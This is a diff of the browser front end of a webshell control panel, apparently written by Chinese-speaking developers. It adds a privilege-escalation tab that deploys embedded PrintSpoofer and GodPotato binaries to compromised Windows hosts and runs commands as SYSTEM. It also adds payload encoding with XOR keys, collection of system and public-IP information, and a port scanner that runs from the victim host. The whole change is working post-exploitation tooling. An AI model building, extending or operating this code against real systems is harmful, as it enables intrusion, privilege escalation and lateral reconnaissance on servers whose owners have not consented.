@@ -71,12 +71,13 @@
     return payload;
   }
 
-  function post(path, body, signal) {
+  function post(path, body, signal, timeoutMs) {
     return api(path, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(body),
       signal,
+      timeoutMs,
     });
   }
 
@@ -123,6 +124,48 @@
     portsRaw: [],
     // PHP 环境能力研判：自动刷新定时器
     phpinfoTimer: null,
+    // 提权工具：是否正在执行
+    privescRunning: false,
+  };
+
+  // ---------- 提权工具注册表 ----------
+  // 已支持 PrintSpoofer 与 Go 版 GodPotato；新增工具只需在此追加一项，
+  // 其 build() 负责把表单字段拼成最终交给 /exec 执行的命令字符串（保持靶机无关、纯前端构造）。
+  const PRIVESC_TOOLS = {
+    printspoofer: {
+      label: 'PrintSpoofer',
+      defaultPath: 'C:\\Windows\\Temp\\',
+      note: '利用 SeImpersonate 提权至 SYSTEM（by itm4n）。服务端已内嵌 PrintSpoofer.exe，点击运行会自动上传到靶机并执行（仅支持 php-eval / asp / asp-vbs / aspnet 类型靶机）。',
+      // 字段：path 靶机上的二进制路径；mode ∈ command|list|interactive；
+      // command 待执行命令（command 模式）；pid 模拟进程 PID（-p，可选）。
+      build({ path, mode, command, pid }) {
+        const parts = [path];
+        if (mode === 'list') {
+          parts.push('-l');
+        } else if (mode === 'interactive') {
+          parts.push('-i');
+        } else {
+          if (!command) return '';
+          // 命令用双引号包裹；内部双引号转义为 \"，避免 cmd.exe 解析错位。
+          const esc = command.replace(/"/g, '\\"');
+          parts.push('-c', '"' + esc + '"');
+        }
+        if (pid) parts.push('-p', pid);
+        return parts.join(' ');
+      },
+    },
+    'godpotato-go': {
+      label: 'GodPotato (Go)',
+      defaultPath: 'C:\\Windows\\Temp\\',
+      // 只有「以 SYSTEM 跑一条命令」一种用法，无需模式/PID 字段。
+      commandOnly: true,
+      note: '纯 Go 版 GodPotato（COM OXID hook + 命名管道冒充），单文件无需 .NET/VC 运行时；服务端已内嵌 godpotato.exe，运行时会自动上传到靶机并以 SYSTEM 执行命令（仅支持 php-eval / asp / asp-vbs / aspnet）。',
+      build({ path, command }) {
+        if (!command) return '';
+        const esc = command.replace(/"/g, '\\"');
+        return path + ' -cmd "cmd /c ' + esc + '"';
+      },
+    },
   };
 
   // ---------- 列表渲染 ----------
@@ -148,13 +191,24 @@
   };
 
   // 由引擎类型推断操作系统：ASP/ASP-VBS 依赖 IIS，必为 Windows；
-  // PHP 型多数跑在 Linux，但也可能在 Windows 上，故标注为推断值。
+  // PHP 型多数跑在 Linux，但也可能在 Windows 上，故先按 Linux 猜测；
+  // 选靶后 detectOS 会实测并把结果写回 t.osDetected，图标随之校正。
   function osOfTarget(t) {
-    if (t.shellType === 'asp' || t.shellType === 'asp-vbs') {
+    if (t.osDetected) {
+      const labelMap = { windows: 'Windows（实测）', linux: 'Linux（实测）', mac: 'macOS（实测）' };
+      return { key: t.osDetected, label: labelMap[t.osDetected] || t.osDetected };
+    }
+    // 后端 /verify 已实测并持久化的系统类型（t.os）：列表直接据此显示正确图标，
+    // 无需先选中靶标再探测。空串表示尚未探测，继续按引擎类型猜测。
+    if (t.os) {
+      const labelMap = { windows: 'Windows（实测）', linux: 'Linux（实测）', mac: 'macOS（实测）' };
+      return { key: t.os, label: labelMap[t.os] || t.os };
+    }
+    if (t.shellType === 'asp' || t.shellType === 'asp-vbs' || t.shellType === 'aspnet') {
       return { key: 'windows', label: 'Windows（ASP/IIS，由引擎类型推断）' };
     }
     if (t.shellType === 'php-eval' || t.shellType === 'php-cmd') {
-      return { key: 'linux', label: 'Linux（由 PHP 引擎推断，实际也可能是 Windows）' };
+      return { key: 'linux', label: 'Linux（由 PHP 引擎推断，实测后校正）' };
     }
     return { key: 'unknown', label: '未知操作系统' };
   }
@@ -230,8 +284,10 @@
     btn.dataset.busy = '0';
     showTestResult(li, ok, detail);
 
-    // 后端已在 /verify 中持久化验证状态，这里同步本列表项的徽章（不整列重渲染，保留按钮态）
+    // 后端已在 /verify 中持久化验证状态与操作系统类型，这里同步内存靶机
+    // （不整列重渲染，保留按钮态；下次列表渲染时图标即显示正确系统类型）。
     target.verified = ok;
+    if (res && res.os) target.os = res.os;
     const badge = li.querySelector('.tbadge');
     if (badge) {
       badge.textContent = ok ? '已验证' : '未验证';
@@ -300,6 +356,17 @@
     if (!target) return;
     state.current = target;
     renderTargets();
+    renderQuickCmds();           // 先用 shellType 猜测，避免空白
+    const selId = target.id;     // 选靶后实测系统类型，再刷新快捷命令与列表图标
+    detectOS().then((os) => {
+      if (state.current && state.current.id === selId) {
+        // 仅在实测成功时写回 osDetected，避免「未探测→按引擎猜测的 Linux」
+        // 覆盖后端已持久化的真实系统类型（t.os）。
+        if (os) state.current.osDetected = os;
+        renderQuickCmds(os);
+        renderTargets();
+      }
+    });
 
     $('empty').classList.add('hidden');
     $('workspace').classList.remove('hidden');
@@ -310,6 +377,7 @@
       type ? type.label : target.shellType,
       '参数 ' + target.param,
       target.proxy ? '代理 ' + target.proxy : null,
+      target.encoding ? '编码 ' + target.encoding : null,
       target.url,
     ].filter(Boolean).join(' · ');
     $('output').textContent = '';
@@ -334,6 +402,7 @@
     stopPhpInfoAuto();
     $('phpinfoBody').textContent = '';
     $('phpinfoUpdated').textContent = '';
+    $('privescOutput').textContent = '';
     $('cmdInput').focus();
   }
 
@@ -399,6 +468,7 @@
 
     let res = null;
     let errorMsg = null;
+    const startedAt = new Date();
     try {
       res = await post('targets/' + encodeURIComponent(state.current.id) + '/exec', { command }, state.abort.signal);
     } catch (err) {
@@ -407,15 +477,43 @@
       resetRunState();
     }
 
-    renderResult(command, res, errorMsg);
+    renderResult(command, res, errorMsg, startedAt);
     input.focus();
   }
 
-  function renderResult(command, res, errorMsg) {
+  // 请求时间格式化为 HH:MM:SS
+  function fmtTime(d) {
+    const p = (n) => (n < 10 ? '0' + n : String(n));
+    return p(d.getHours()) + ':' + p(d.getMinutes()) + ':' + p(d.getSeconds());
+  }
+
+  // 让结果块可折叠：点击块头切换 .collapsed（隐藏输出正文）。折叠样式与箭头图标由 CSS 负责。
+  function makeBlockCollapsible(box) {
+    const head = box.querySelector(':scope > .block-head');
+    if (!head || head.dataset.collapsible) return;
+    head.dataset.collapsible = '1';
+    head.classList.add('toggleable');
+    head.insertBefore(el('span', 'block-toggle'), head.firstChild);
+    head.addEventListener('click', () => box.classList.toggle('collapsed'));
+  }
+
+  // 把新结果块推入输出区：历史块默认收起，仅最新一块展开，避免结果无限堆高、外层出现滚动条。
+  function pushOutputBlock(out, box) {
+    out.querySelectorAll(':scope > .block').forEach(b => b.classList.add('collapsed'));
+    box.classList.remove('collapsed');
+    makeBlockCollapsible(box);
+    out.insertBefore(box, out.firstChild);
+    box.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }
+
+  function renderResult(command, res, errorMsg, startedAt) {
     const box = el('div', 'block');
 
     const head = el('div', 'block-head');
-    head.appendChild(el('span', 'cmd', '$ ' + command));
+    const left = el('div', 'cmd-left');
+    if (startedAt) left.appendChild(el('span', 'rtime', fmtTime(startedAt)));
+    left.appendChild(el('span', 'cmd', '$ ' + command));
+    head.appendChild(left);
     const actualErr = errorMsg || (res && res.error) || '';
     if (actualErr) {
       head.appendChild(el('span', 'stat err', '失败 · ' + actualErr));
@@ -438,10 +536,183 @@
       body.textContent = '（靶机无回显）';
     }
     box.appendChild(body);
-    if (res) box.appendChild(el('div', 'req', '请求 ' + res.requestUrl + '\n载荷 ' + res.payload));
+    // 请求 URL 与载荷较长，默认折叠，避免直接铺开在回显下方；需要排查时再展开。
+    if (res) {
+      const reqBox = el('details', 'req');
+      reqBox.appendChild(el('summary', '', '请求详情'));
+      reqBox.appendChild(el('pre', 'req-body', '请求 ' + res.requestUrl + '\n载荷 ' + res.payload));
+      box.appendChild(reqBox);
+    }
 
-    $('output').appendChild(box);
-    box.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    // 逆序展示：最新一次执行结果排在最上方；历史块默认收起，仅最新一块展开
+    const out = $('output');
+    pushOutputBlock(out, box);
+  }
+
+  // ---------- 提权（Privilege Escalation） ----------
+
+  // 切换提权工具：刷新默认路径与说明（注册表里只有一项时也可扩展）。
+  // 记录上一次工具的默认路径，用于判断用户是否自定义过路径（避免切换工具时覆盖其手填值）。
+  let peLastDefaultPath = '';
+  function selectPeTool() {
+    const spec = PRIVESC_TOOLS[$('peTool').value];
+    if (!spec) return;
+    const cur = $('pePath').value.trim();
+    // 路径为空、或仍为上一工具的默认值（未自定义）时，跟随切换到新默认值。
+    if (!cur || cur === peLastDefaultPath) $('pePath').value = spec.defaultPath;
+    peLastDefaultPath = spec.defaultPath;
+    $('peToolNote').textContent = spec.note || '';
+
+    // 只支持命令模式的工具（如 GodPotato）：强制切到 command，并隐藏对其无意义的
+    // 「执行模式 / 模拟进程 PID」字段；切回 PrintSpoofer 时恢复显示。
+    const commandOnly = !!spec.commandOnly;
+    if (commandOnly) $('peMode').value = 'command';
+    $('peModeField').classList.toggle('hidden', commandOnly);
+    $('pePidField').classList.toggle('hidden', commandOnly);
+    syncPeMode();
+  }
+
+  // 运行提权：把表单字段（路径 / 模式 / 命令 / PID）发给后端 /privesc 接口，
+  // 由服务端把内嵌的 PrintSpoofer.exe 自动部署到靶机并执行；命令字符串由后端构造，
+  // 前端仅用 spec.build() 生成展示用文本（不含真实逻辑）。
+  async function runPrivesc() {
+    if (state.privescRunning) return;
+    if (!state.current) { toast('请先选择一个靶标'); return; }
+
+    const spec = PRIVESC_TOOLS[$('peTool').value];
+    if (!spec) { toast('未知提权工具'); return; }
+
+    const path = $('pePath').value.trim();
+    if (!path) { toast('请填写靶机上的工具路径'); return; }
+    const mode = $('peMode').value;
+    const command = $('peCmd').value.trim();
+    const pid = $('pePid').value.trim();
+
+    let dispCmd = spec.build({ path, mode, command, pid }) || '(执行中)';
+
+    const btn = $('peRun');
+    state.privescRunning = true;
+    btn.disabled = true;
+    $('peStatus').textContent = '部署并执行中…';
+    const startedAt = new Date();
+    let res = null, errorMsg = null;
+    try {
+      res = await post('targets/' + encodeURIComponent(state.current.id) + '/privesc',
+        { tool: $('peTool').value, path, mode, command, pid }, null, PRIVESC_REQ_TIMEOUT);
+    } catch (err) {
+      errorMsg = (err && err.message) || String(err);
+    } finally {
+      state.privescRunning = false;
+      btn.disabled = false;
+      $('peStatus').textContent = '';
+    }
+    // 服务端实际执行的是真实落盘路径（{md5}.exe），用它在结果头里覆盖客户端预览命令，
+    // 否则会显示成用户填写的 C:\Windows\Temp\GodPotato.exe，与实际文件对不上。
+    if (res && res.deployedPath) {
+      dispCmd = spec.build({ path: res.deployedPath, mode, command, pid }) || dispCmd;
+    }
+    renderPrivescResult(dispCmd, res, errorMsg, startedAt);
+  }
+
+  // 把提权执行结果渲染到专用输出区（不混入终端输出），结构与 renderResult 保持一致。
+  function renderPrivescResult(command, res, errorMsg, startedAt) {
+    const box = el('div', 'block');
+    const head = el('div', 'block-head');
+    const left = el('div', 'cmd-left');
+    if (startedAt) left.appendChild(el('span', 'rtime', fmtTime(startedAt)));
+    left.appendChild(el('span', 'cmd', '$ ' + command));
+    head.appendChild(left);
+    const actualErr = errorMsg || (res && res.error) || '';
+    if (actualErr) {
+      head.appendChild(el('span', 'stat err', '失败 · ' + actualErr));
+    } else {
+      const parts = ['HTTP ' + res.status, res.latencyMs + ' ms'];
+      if (res.truncated) parts.push('回显已截断');
+      const ok = res.ok && !res.error;
+      head.appendChild(el('span', 'stat ' + (ok ? 'ok' : 'err'), parts.join(' · ')));
+    }
+    box.appendChild(head);
+
+    const body = el('pre', 'body-text');
+    if (res && res.output) {
+      body.textContent = res.output;
+    } else if (actualErr) {
+      body.classList.add('placeholder');
+      body.textContent = actualErr;
+    } else {
+      body.classList.add('placeholder');
+      body.textContent = '（靶机无回显）';
+    }
+    box.appendChild(body);
+
+    const out = $('privescOutput');
+    pushOutputBlock(out, box);
+  }
+
+  // 部署自检：只走「分块上传 → 组装 → MD5 校验」，不执行提权。
+  // 用于在不必跑完整提权流程的前提下，定位靶机侧究竟是写不进 / 读不出 / 拼不上。
+  async function runDeployCheck() {
+    if (state.privescRunning) return;
+    if (!state.current) { toast('请先选择一个靶标'); return; }
+
+    const path = $('pePath').value.trim();
+    if (!path) { toast('请填写靶机上的工具路径'); return; }
+
+    const btn = $('peDeploy');
+    state.privescRunning = true;
+    btn.disabled = true;
+    $('peRun').disabled = true;
+    $('peStatus').textContent = '部署自检中…';
+    let rep = null, errorMsg = null;
+    try {
+      rep = await post('targets/' + encodeURIComponent(state.current.id) + '/privesc',
+        { tool: $('peTool').value, path, deployOnly: true }, null, PRIVESC_REQ_TIMEOUT);
+    } catch (err) {
+      errorMsg = (err && err.message) || String(err);
+    } finally {
+      state.privescRunning = false;
+      btn.disabled = false;
+      $('peRun').disabled = false;
+      $('peStatus').textContent = '';
+    }
+    renderDeployReport(rep, errorMsg);
+  }
+
+  // 渲染部署自检报告：顶部一行结论，下面逐条列出每一步的命令与靶机回显。
+  function renderDeployReport(rep, errorMsg) {
+    const ok = !!(rep && rep.verified) && !errorMsg;
+    const box = el('div', 'block');
+    const head = el('div', 'block-head');
+    const left = el('div', 'cmd-left');
+    left.appendChild(el('span', 'rtime', fmtTime(new Date())));
+    left.appendChild(el('span', 'cmd', '[部署自检] ' + ((rep && rep.path) || '')));
+    head.appendChild(left);
+    head.appendChild(el('span', 'stat ' + (ok ? 'ok' : 'err'), ok ? '成功' : '失败'));
+    box.appendChild(head);
+
+    const body = el('pre', 'body-text');
+    const lines = [];
+    if (errorMsg) lines.push('请求失败: ' + errorMsg);
+    if (rep) {
+      lines.push('目标路径: ' + (rep.path || ''));
+      lines.push('内嵌大小: ' + (rep.size || 0) + ' 字节');
+      lines.push('内嵌 MD5: ' + (rep.md5 || ''));
+      lines.push('分块数量: ' + (rep.chunks || 0));
+      lines.push('跳过上传: ' + (rep.skipped ? '是（已存在且 MD5 一致）' : '否'));
+      lines.push('MD5 校验: ' + (rep.verified ? '通过' : '未通过'));
+      if (rep.note) lines.push('说明: ' + rep.note);
+      lines.push('');
+      (rep.steps || []).forEach((st, i) => {
+        lines.push((i + 1) + '. ' + st.name + (st.ok ? '' : '  ← 失败'));
+        if (st.cmd) lines.push('   命令: ' + st.cmd);
+        if (st.output) lines.push('   回显: ' + st.output);
+      });
+    }
+    body.textContent = lines.join('\n');
+    box.appendChild(body);
+
+    const out = $('privescOutput');
+    pushOutputBlock(out, box);
   }
 
   function toast(msg) {
@@ -449,7 +720,9 @@
     row.appendChild(el('span', 'htime', '提示'));
     row.appendChild(el('span', 'hstatus err', ''));
     row.appendChild(el('span', 'hcmd', msg));
-    $('output').appendChild(row);
+    // 与执行结果保持一致，提示同样插到最上方
+    const out = $('output');
+    out.insertBefore(row, out.firstChild);
   }
 
   function pushHistory(command) {
@@ -474,6 +747,12 @@
     $('typeNote').textContent = type.note + '\n靶机侧样本：' + type.snippet.replace('{param}', param);
   }
 
+  // updateEncodingUI 在选择 xor 时显示密钥输入框，其余编码方式隐藏。
+  function updateEncodingUI() {
+    const enc = $('targetForm').elements.encoding.value;
+    $('encKeyWrap').style.display = enc === 'xor' ? '' : 'none';
+  }
+
   function openForm(target) {
     state.editingID = target ? target.id : null;
     $('formTitle').textContent = target ? '编辑靶标' : '新建靶标';
@@ -488,6 +767,9 @@
       f.method.value = target.method || 'POST';
       f.note.value = target.note || '';
       f.proxy.value = target.proxy || '';
+      f.encoding.value = target.encoding || '';
+      f.encodingKey.value = target.encodingKey || '';
+      updateEncodingUI();
     } else {
       f.shellType.value = (state.types[0] && state.types[0].id) || '';
       f.param.value = 'pass';
@@ -514,14 +796,28 @@
       method: f.method.value,
       note: f.note.value.trim(),
       proxy: f.proxy.value.trim(),
+      encoding: f.encoding.value.trim(),
+      encodingKey: f.encodingKey.value.trim(),
     };
+  }
+
+  // sysSummary 把 /api/sysinfo/{id} 返回的结构化信息压成一行摘要，用于新建成功后的提示。
+  function sysSummary(d) {
+    if (!d) return '已采集系统信息';
+    const parts = [];
+    if (d.os) parts.push('系统 ' + d.os);
+    if (d.hostname) parts.push('主机 ' + d.hostname);
+    if (d.user) parts.push('用户 ' + d.user);
+    if (d.pubIP) parts.push('公网IP ' + d.pubIP);
+    return parts.length ? parts.join(' · ') : '已采集系统信息';
   }
 
   async function submitForm(ev) {
     ev.preventDefault();
     const form = ev.target;
     const btn = form.querySelector('button[type="submit"]');
-    if (btn) { btn.disabled = true; btn.dataset.label = btn.textContent; btn.textContent = '保存中…'; }
+    const isNew = !state.editingID;
+    if (btn) { btn.disabled = true; btn.dataset.label = btn.textContent; btn.textContent = isNew ? '验证中…' : '保存中…'; }
     let body;
     try {
       body = formBody();
@@ -531,15 +827,52 @@
       return;
     }
     try {
+      let createdID = null;
       if (state.editingID) {
         await put('targets/' + encodeURIComponent(state.editingID), body);
       } else {
-        await post('targets', body);
+        // 新建靶标：先入库拿到 ID，再执行一次验证（顺便取系统信息）。
+        // 验证失败则不保留——询问用户是否仍要添加；确认放弃则删除刚创建的记录。
+        const created = await post('targets', body);
+        createdID = (created && created.id) || null;
+        if (!createdID) throw new Error('创建靶标未返回 ID');
+
+        let verified = false;
+        let vres = null;
+        let vErr = null;
+        try {
+          vres = await post('targets/' + encodeURIComponent(createdID) + '/verify');
+          verified = !!(vres && vres.verified);
+        } catch (e) {
+          vErr = e;
+        }
+
+        if (verified) {
+          // 验证通过：后端已在 /verify 中实测并持久化操作系统类型（t.os），
+          // 列表将据此直接显示正确系统图标，无需再单独请求完整系统信息。
+          const osKey = vres && vres.os;
+          const ms = vres && vres.latencyMs != null ? '（' + vres.latencyMs + 'ms）' : '';
+          const osLabel = osKey === 'windows' ? 'Windows' : osKey === 'linux' ? 'Linux'
+            : osKey === 'mac' ? 'macOS' : '';
+          toast('验证通过' + ms + (osLabel ? '，系统 ' + osLabel : '，已记录靶标'));
+        } else {
+          const reason = vErr ? (vErr.message || '验证请求失败') : explainFailure(vres, (vres && vres.output) || '', null);
+          const keep = window.confirm('验证失败：' + reason + '\n是否仍要添加该靶标？');
+          if (!keep) {
+            await del('targets/' + encodeURIComponent(createdID));
+            closeModals();
+            await loadTargets();
+            if (btn) { btn.disabled = false; btn.textContent = btn.dataset.label || '保存'; }
+            return;
+          }
+          toast('已保留未通过验证的靶标，可稍后点「测试连接」重试。');
+        }
       }
       closeModals();
       const editingID = state.editingID;
       await loadTargets();
       if (editingID) selectTarget(editingID);
+      else if (createdID) selectTarget(createdID);
     } catch (err) {
       if (err.status === UNAUTHORIZED) requireToken();
       toast('保存失败：' + err.message);
@@ -559,6 +892,21 @@
     } catch (err) {
       if (err.status === UNAUTHORIZED) requireToken();
       toast('删除失败：' + err.message);
+    }
+  }
+
+  // clearModules 调用 DELETE /api/targets/modules/{id}，清空靶机会话中缓存的
+  // 模块源码（Application / Session），常用于模块修复后让靶机重新加载。
+  async function clearModules() {
+    const target = state.current;
+    if (!target) return;
+    if (!confirm('确认清空靶机「' + target.name + '」上缓存的模块源码？\n清空后下次调用会自动重新加载（如模块已修复则会载入新版本）。')) return;
+    try {
+      await del('targets/modules/' + encodeURIComponent(target.id));
+      toast('已清空「' + target.name + '」的模块缓存');
+    } catch (err) {
+      if (err.status === UNAUTHORIZED) requireToken();
+      toast('清空失败：' + err.message);
     }
   }
 
@@ -668,6 +1016,7 @@
     $('procPanel').classList.toggle('hidden', name !== 'proc');
     $('portsPanel').classList.toggle('hidden', name !== 'ports');
     $('phpinfoPanel').classList.toggle('hidden', name !== 'phpinfo');
+    $('privescPanel').classList.toggle('hidden', name !== 'privesc');
     $('infoPanel').classList.toggle('hidden', name !== 'info');
     document.querySelectorAll('.tab').forEach((b) => {
       b.classList.toggle('active', b.dataset.tab === name);
@@ -687,18 +1036,27 @@
     if (name === 'phpinfo' && state.current) {
       loadPhpInfo();
     }
+    if (name === 'privesc' && state.current) {
+      syncPeMode();
+    }
     if (name === 'info' && state.current) {
       loadInfo();
     }
   }
 
-  // 读取靶机系统资源概览：GET /api/targets/{id}/sys/info
+  // 提权：按执行模式显隐命令输入框（list/interactive 模式不需要命令）。
+  function syncPeMode() {
+    const mode = $('peMode').value;
+    $('peCmdWrap').classList.toggle('hidden', mode !== 'command');
+  }
+
+  // 读取靶机系统资源概览：GET /api/sysinfo/{id}
   async function loadSys() {
     if (!state.current) return;
     const body = $('sysBody');
     if (!body.childElementCount) body.appendChild(el('div', 'fs-hint', '加载中…'));
     try {
-      const d = await api('targets/' + encodeURIComponent(state.current.id) + '/sys/info');
+      const d = await api('sysinfo/' + encodeURIComponent(state.current.id));
       renderSys(d, body);
       $('sysUpdated').textContent = '更新于 ' + new Date().toLocaleTimeString();
     } catch (err) {
@@ -874,6 +1232,7 @@
     // 网络地址：内网 IP（靶机网卡地址）与公网 IP（出网探测结果）
     const intIPs = Array.isArray(d.intIPs) ? d.intIPs : [];
     const pubIP = d.pubIP || '';
+    const pubErr = d.pubErr || '';
     const netCard = el('div', 'sys-card wide');
     netCard.appendChild(el('div', 'sys-card-title', '网络地址'));
     const irow = el('div', 'sys-card-row');
@@ -882,7 +1241,7 @@
     netCard.appendChild(irow);
     const prow = el('div', 'sys-card-row');
     prow.appendChild(el('span', 'sys-k', '公网 IP'));
-    prow.appendChild(el('span', 'sys-v', pubIP ? pubIP : '—（靶机无出网或已禁用）'));
+    prow.appendChild(el('span', 'sys-v', pubIP ? pubIP : ('—（' + (pubErr ? pubErr : '靶机无出网或已禁用') + '）')));
     netCard.appendChild(prow);
     body.appendChild(netCard);
 
@@ -1141,9 +1500,13 @@
     }
     // 按地址族、端口号排序，端口号小的在前，便于对照
     const sorted = list.slice().sort((a, b) => (Number(a.port) || 0) - (Number(b.port) || 0));
+    // inode 只有 Linux(/proc) 目标才有值，Windows 的 netstat 恒为空，此时隐藏该列
+    const hasInode = list.some((p) => String(p.inode || '') !== '');
+    const cols = ['协议', '本地地址', '端口', '进程', 'PID'];
+    if (hasInode) cols.push('inode');
     const tbl = el('table', 'sys-proc');
     const thead = el('tr', '');
-    ['协议', '本地地址', '端口', '进程', 'PID', 'inode'].forEach((h) => thead.appendChild(el('th', '', h)));
+    cols.forEach((h) => thead.appendChild(el('th', '', h)));
     tbl.appendChild(thead);
     sorted.forEach((p) => {
       const tr = el('tr', '');
@@ -1152,7 +1515,7 @@
       tr.appendChild(el('td', 'mono', String(p.port || '—')));
       tr.appendChild(el('td', 'mono', String(p.comm || '—')));
       tr.appendChild(el('td', 'mono', String(p.pid || '—')));
-      tr.appendChild(el('td', 'mono', String(p.inode || '—')));
+      if (hasInode) tr.appendChild(el('td', 'mono', String(p.inode || '—')));
       tbl.appendChild(tr);
     });
     const wrap = el('div', 'sys-proc-wrap');
@@ -1161,6 +1524,13 @@
   }
 
   // ---------- 端口扫描（在靶机上对目标主机发起 TCP 探测） ----------
+
+  // ---- 提权 / 部署自检专属超时 ----
+  // 这两类请求是「多步串行长任务」：目录探针 → 清理 → 分块上传（策略 C 可达 ~280 次往返）
+  // → 组装 → MD5 校验 → 执行。客户端默认超时来自服务端单次命令超时 +5s（通常 20s），
+  // 远不够覆盖整条链路，会在服务端还在跑时就被 AbortError 拦死（表现为「20 秒未返回」）。
+  // 故单独放宽到 5 分钟，与服务端每步 120s 上限对齐并留足多次往返余量。
+  const PRIVESC_REQ_TIMEOUT = 300000;
 
   // ---- 端口/主机展开与分批（前端分批，保证每次请求 ≤30s）----
   const SCAN_PORT_BATCH = 5;   // 每请求携带的端口数；ASP/PHP 每端口最坏 2s → 5×2=10s ≤30s
@@ -1254,7 +1624,20 @@
 
   // 对目标主机做 TCP 端口扫描：GET /api/targets/{id}/scan?host=&ports=
   // 前端按「1 主机 × ≤12 端口」分批，每请求对应靶机一次 ≤24s 的脚本，保证每次请求 ≤30s 并展示进度。
+  let scanRunning = false;
+  let scanAbort = null;
+
+  // 扫描按钮：未运行时开始扫描，运行中点击则终止扫描。
+  function scanBtnClick() {
+    if (scanRunning) {
+      if (scanAbort) scanAbort.abort();
+      return;
+    }
+    loadScan();
+  }
+
   async function loadScan() {
+    if (scanRunning) return;
     if (!state.current) return;
     const hostSpec = $('scanHost').value.trim();
     const portsSpec = $('scanPorts').value.trim();
@@ -1284,20 +1667,32 @@
       status.className = 'scan-status err';
       return;
     }
+    scanRunning = true;
+    const btn = $('scanBtn');
+    scanAbort = new AbortController();
+    btn.textContent = '停止';
+    btn.classList.remove('primary');
+    btn.classList.add('danger');
+    btn.disabled = false;
     status.textContent = '扫描中…';
     status.className = 'scan-status';
     body.textContent = '';
+    let done = 0;
+    let elapsedSum = 0;
+    let lastMethod = '';
+    let lastDiag = '';
+    const recs = new Map();
+    for (const h of hosts) recs.set(h, { ports: new Map(), alive: false });
+    const portBatches = chunkArray(portList, SCAN_PORT_BATCH);
+    const total = hosts.length * portBatches.length;
+    const view = () => renderScan(buildScanView(recs, hosts, portList), hosts.length === 1 ? hostSpec : null);
     try {
-      const portBatches = chunkArray(portList, SCAN_PORT_BATCH);
-      const total = hosts.length * portBatches.length;
-      let done = 0;
-      let elapsedSum = 0;
-      const recs = new Map();
-      for (const h of hosts) recs.set(h, { ports: new Map(), alive: false });
+      scanLoop:
       for (const h of hosts) {
         for (const pb of portBatches) {
+          if (scanAbort.signal.aborted) break scanLoop;
           const q = '?host=' + encodeURIComponent(h) + '&ports=' + encodeURIComponent(pb.join(','));
-          const d = await api('targets/' + encodeURIComponent(state.current.id) + '/scan' + q, { timeoutMs: SCAN_REQ_TIMEOUT });
+          const d = await api('targets/' + encodeURIComponent(state.current.id) + '/scan' + q, { timeoutMs: SCAN_REQ_TIMEOUT, signal: scanAbort.signal });
           const ps = (d && Array.isArray(d.ports)) ? d.ports : [];
           const rec = recs.get(h);
           for (const p of ps) {
@@ -1306,22 +1701,46 @@
             if (p.open) rec.alive = true;
           }
           if (typeof d.elapsed === 'number') elapsedSum += d.elapsed;
+          else if (typeof d.elapsed === 'string' && d.elapsed !== '') { const n = parseFloat(d.elapsed); if (!isNaN(n)) elapsedSum += n; }
+          if (d.method) lastMethod = d.method;
+          if (d.diag) lastDiag = String(d.diag).slice(0, 160);
           done++;
           status.textContent = '扫描中… ' + done + '/' + total + (hosts.length > 1 ? '（' + h + '）' : '');
-          if (hosts.length > 1) renderScan(buildScanView(recs, hosts, portList), null);
+          view();
         }
       }
-      renderScan(buildScanView(recs, hosts, portList), hosts.length === 1 ? hostSpec : null);
+      const stopped = scanAbort.signal.aborted;
+      view();
       const openTotal = [...recs.values()].reduce((s, r) => s + [...r.ports.values()].filter(Boolean).length, 0);
       const aliveCount = [...recs.values()].filter((r) => r.alive).length;
       const elapsed = elapsedSum > 0 ? elapsedSum.toFixed(2) + 's' : '—';
-      status.textContent = '扫描完成：' + (hosts.length > 1
-        ? ('共 ' + hosts.length + ' 个目标，在线 ' + aliveCount + ' 个，开放端口 ' + openTotal + ' 个')
-        : ('共 ' + portList.length + ' 个端口，开放 ' + openTotal + ' 个')) + '，用时 ' + elapsed;
-      status.className = 'scan-status ok';
+      if (stopped) {
+        status.textContent = '已停止：已扫描 ' + done + '/' + total + ' 批，已发现开放端口 ' + openTotal + ' 个，用时 ' + elapsed
+          + (lastMethod ? ' ［探测方式：' + lastMethod + '］' : '');
+        status.className = 'scan-status';
+      } else {
+        status.textContent = '扫描完成：' + (hosts.length > 1
+          ? ('共 ' + hosts.length + ' 个目标，在线 ' + aliveCount + ' 个，开放端口 ' + openTotal + ' 个')
+          : ('共 ' + portList.length + ' 个端口，开放 ' + openTotal + ' 个')) + '，用时 ' + elapsed
+          + (lastMethod ? ' ［探测方式：' + lastMethod + '］' : '')
+          + (lastDiag ? ' 诊断：' + lastDiag : '');
+        status.className = 'scan-status ok';
+      }
     } catch (err) {
-      status.textContent = '扫描失败：' + err.message;
-      status.className = 'scan-status err';
+      if (scanAbort && scanAbort.signal.aborted) {
+        view();
+        status.textContent = '已停止：已扫描 ' + done + '/' + total + ' 批';
+        status.className = 'scan-status';
+      } else {
+        status.textContent = '扫描失败：' + err.message;
+        status.className = 'scan-status err';
+      }
+    } finally {
+      scanRunning = false;
+      scanAbort = null;
+      btn.textContent = '扫描';
+      btn.classList.remove('danger');
+      btn.classList.add('primary');
     }
   }
 
@@ -1352,30 +1771,33 @@
       body.appendChild(wrap);
       return;
     }
-    // 单主机结果（旧结构）
+    // 单主机结果（旧结构）：只列出开放的端口
     const ports = Array.isArray(d.ports) ? d.ports : [];
     if (!ports.length) {
       body.appendChild(el('div', 'fs-hint', '（无数据）'));
       return;
     }
     const open = ports.filter((p) => p.open);
-    const sorted = ports.slice().sort((a, b) => (Number(a.port) || 0) - (Number(b.port) || 0));
+    body.appendChild(el('div', 'fs-hint', '开放 ' + open.length + ' / ' + ports.length + ' 个端口' + (open.length ? '：' + open.map((p) => p.port).join(', ') : '')));
+    if (!open.length) {
+      body.appendChild(el('div', 'fs-hint', '（无开放端口）'));
+      return;
+    }
+    const sorted = open.slice().sort((a, b) => (Number(a.port) || 0) - (Number(b.port) || 0));
     const tbl = el('table', 'sys-proc');
     const thead = el('tr', '');
     ['端口', '状态', '主机'].forEach((h) => thead.appendChild(el('th', '', h)));
     tbl.appendChild(thead);
     sorted.forEach((p) => {
-      const tr = el('tr', p.open ? 'open-row' : '');
+      const tr = el('tr', 'open-row');
       tr.appendChild(el('td', 'mono', String(p.port)));
-      tr.appendChild(el('td', 'mono', p.open ? '开放' : '关闭'));
+      tr.appendChild(el('td', 'mono', '开放'));
       tr.appendChild(el('td', 'mono', String(host || '—')));
       tbl.appendChild(tr);
     });
     const wrap = el('div', 'sys-proc-wrap');
     wrap.appendChild(tbl);
     body.appendChild(wrap);
